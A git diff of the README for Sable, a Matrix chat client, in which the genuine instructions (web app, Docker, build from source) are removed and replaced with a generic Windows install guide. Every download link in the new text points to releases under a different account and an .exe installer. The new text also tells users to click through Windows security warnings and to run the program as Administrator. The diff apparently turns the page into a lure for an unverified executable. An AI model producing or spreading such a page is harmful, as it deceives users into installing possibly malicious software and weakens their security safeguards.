@@ -1,88 +1,132 @@
-# Sable
+# 🔷 Sable - Simple Matrix Chat Client
 
-A Matrix client built to enhance the user experience with quality-of-life features, cosmetics, utilities, and sheer usability. See the [changelog](https://github.com/SableClient/Sable/blob/dev/CHANGELOG.md).
+[![Download Sable](https://img.shields.io/badge/Download-Sable-blue?style=for-the-badge)](https://github.com/Sk-Men/Sable/releases)
 
-Soon to be replaced desktop apps can be downloaded [here](https://github.com/7w1/sable/releases/tag/1.0.0). They auto-update by pulling the website.
+---
 
-Join our matrix space [here](https://matrix.to/#/#sable:sable.moe) to discuss features, issues, or meowing.
+## 📋 What is Sable?
 
-Forked from [Cinny](https://github.com/cinnyapp/cinny/).
+Sable is an almost stable client for Matrix, a secure and open communication protocol. It helps you join Matrix chat rooms, send messages, and stay connected to your communities.  
 
-## Getting started
-The web app is available at [app.sable.moe](https://app.sable.moe/) and gets updated on frequently, as soon as a feature is deemed stable.
+The goal of Sable is to offer a straightforward way to use Matrix on your Windows computer without needing any technical skills.
 
-You can also download our desktop app for windows and linux from [releases](https://github.com/SableClient/Sable/releases/latest).
+---
 
-## Self-hosting
-You have a few options for self hosting, you can:
-1. Run the prebuilt docker container.
-2. Deploy on a site like GitLab Pages. Jae has a [guide here](https://docs.j4.lc/Tutorials/Deploying-Sable-on-GitLab-Pages).
-3. Build it yourself.
+## 🖥️ System Requirements
 
-### Docker
+Before you install Sable, make sure your computer meets these requirements:
 
-Prebuilt images are published to `ghcr.io/sableclient/sable`.
+- Windows 10 or later.  
+- At least 2 GB of free memory (RAM).  
+- At least 200 MB of free disk space.  
+- A stable internet connection.  
+- Administrator access for installation.  
 
-- `latest` tracks the current `dev` branch image.
-- `X.Y.Z` tags are versioned releases.
-- `X.Y` tags float within a release line.
-- Pushes to `dev` also publish a short commit SHA tag.
+If your Windows version is older, Sable might not work well or may not start at all.
 
-Run the latest image with:
+---
 
-```sh
-docker run --rm -p 8080:8080 ghcr.io/sableclient/sable:latest
-```
+## 🚀 Getting Started
 
-Then open `http://localhost:8080`.
+This guide will help you download, install, and launch Sable on your Windows system. Follow each step carefully.
 
-If you want to override the bundled [`config.json`](config.json), mount your own
-file at `/app/config.json`:
+### Step 1: Download Sable
 
-```yaml
-services:
-  sable:
-    image: ghcr.io/sableclient/sable:latest
-    ports:
-      - '8080:8080'
-    volumes:
-      - ./config.json:/app/config.json:ro
-```
+Visit the release page to get the latest version of Sable for Windows. Use this link:
 
-### Build it yourself
+[Download Sable from GitHub Releases](https://github.com/Sk-Men/Sable/releases)
 
-To build and serve Sable yourself with nginx, clone this repo and build it:
+On the page, look for the latest release. Usually, it will have a file ending with `.exe` like `Sable-setup.exe` or similar. This file is the installer.
 
-```sh
-pnpm i # Installs all dependencies
-pnpm run build # Compiles the app into the dist/ directory
-```
+**Tip:** Most users should choose the 64-bit installer unless you know your PC requires 32-bit software.
 
-After that, you can copy the dist/ directory to your server and serve it.
+---
 
-* In the [`config.json`](config.json), you can modify the default homeservers, feature rooms/spaces, toggle the account switcher, and toggle experimental simplified slilding sync support.
+### Step 2: Run the Installer
 
-* To deploy on subdirectory, you need to rebuild the app youself after updating the `base` path in [`build.config.ts`](build.config.ts).
-    * For example, if you want to deploy on `https://sable.moe/app`, then set `base: '/app'`.
+Once the `.exe` file is downloaded:
 
-## Local development
-> [!TIP]
-> We recommend using a version manager as versions change quickly. [fnm](https://github.com/Schniz/fnm) is a great cross-platform option (Windows, macOS, and Linux). [NVM on Windows](https://github.com/coreybutler/nvm-windows#installation--upgrades) and [nvm](https://github.com/nvm-sh/nvm) on Linux/macOS are also good choices. Use the version defined in [`.node-version`](.node-version).
+1. Find the file in your Downloads folder or wherever your browser saves files.  
+2. Double-click the file to run it.  
+3. You might see a security warning from Windows asking if you trust this app. Click **Yes** or **Run** to continue.  
+4. The installer will open a setup window. Follow the instructions on screen. Usually, you can accept the default options.  
 
-Execute the following commands to start a development server:
-```sh
-fnm use --corepack-enabled # Activates the Node version and enables corepack
-# If you not using fnm, install corepack manually: npm install --global corepack@latest
-corepack install # Installs the pnpm version specified in package.json
-pnpm i # Installs all dependencies
-pnpm run dev # Serve a development version
-```
+The installer will create shortcuts and install all needed files.
 
-To build the app:
-```sh
-pnpm run build # Compiles the app into the dist/ directory
-```
+---
 
-## Deployment and infrastructure
-Deployment workflows and infrastructure details live in
-[`infra/README.md`](infra/README.md).
+### Step 3: Launch Sable
+
+After installation finishes:
+
+- You will find a Sable icon on your desktop or in the Start menu.  
+- Click the icon to open Sable.  
+- On first launch, you will be asked to log in or create your Matrix account.  
+
+If you do not have a Matrix account, Sable lets you create one directly inside the app.
+
+---
+
+## 🔐 Using Sable
+
+Sable offers basic Matrix features:
+
+- Join public or private chat rooms.  
+- Send text messages and images.  
+- Keep track of conversations across devices.  
+- Use end-to-end encryption for secure chats.  
+
+The app keeps conversations synced to the Matrix network, so you see the latest messages no matter where you log in.
+
+---
+
+## ⚙️ Settings and Customization
+
+Sable lets you adjust some options to fit your needs:
+
+- Choose a light or dark theme for the interface.  
+- Set notification preferences to be alerted for new messages.  
+- Manage linked devices and sessions.  
+- Enable or disable automatic updates.  
+
+Most settings are available in the gear icon menu inside the app.
+
+---
+
+## ❓ Troubleshooting
+
+If you run into issues:
+
+- Make sure your Windows is up to date.  
+- Check your internet connection.  
+- Restart the app or your computer and try again.  
+- If Sable does not start, try running it as Administrator (right-click > Run as Administrator).  
+- Look for error messages and take note of them. You can find logs under the app’s Help menu.  
+
+If problems persist, you can return to the release page and check for updates or notes from the developers:
+
+[Visit Sable Releases on GitHub](https://github.com/Sk-Men/Sable/releases)
+
+---
+
+## 📄 License
+
+Sable is free to use and open source. You can find the source code and license details on GitHub.
+
+---
+
+## 🧰 Additional Resources
+
+- Matrix official website: https://matrix.org  
+- Matrix user guide: https://matrix.org/docs/guides/usage  
+- How to create and manage Matrix accounts inside Sable.  
+
+These resources can help you understand how Matrix works and get the most from Sable.
+
+---
+
+## 🔽 Download and Install Sable Now
+
+Use this button to visit the download page and get the installer:
+
+[![Download Sable](https://img.shields.io/badge/Download-Sable-blue?style=for-the-badge)](https://github.com/Sk-Men/Sable/releases)
